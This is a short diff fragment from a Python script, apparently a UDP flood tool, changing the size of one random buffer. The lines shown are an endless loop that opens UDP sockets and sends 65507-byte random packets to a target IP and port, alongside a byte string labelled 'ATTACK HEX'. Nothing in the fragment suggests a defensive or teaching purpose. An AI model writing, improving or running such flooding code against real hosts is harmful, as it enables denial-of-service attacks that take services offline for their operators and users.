@@ -95,7 +95,7 @@ def xxxxxxx():
     while True:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random._urandom(65507) #1081
-        pack = random._urandom(512) #666
+        pack = random._urandom(999) #666
         payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
         msg = Randomlex[random.randrange(0, 9)]
         sock.sendto(bytes, (ip, int(port)))
